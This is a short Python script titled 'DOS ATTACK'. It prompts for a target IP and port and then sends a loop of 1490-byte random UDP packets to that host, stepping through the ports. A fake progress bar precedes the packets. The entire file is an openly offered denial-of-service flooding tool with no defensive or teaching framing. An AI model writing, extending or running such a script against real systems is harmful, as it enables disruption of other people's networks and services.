import sys
import os
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print("DOS ATTACK")
ip = input("IP Target : ")
port = input("Port       : ")

os.system("clear")
print("Attack Starting")
print ("[==========          ] 50%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
cnt=0
while cnt<=100:
     sock.sendto(bytes, (ip,int(port)))
     sent = sent + 1
     port = int(port) + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
     cnt+=1
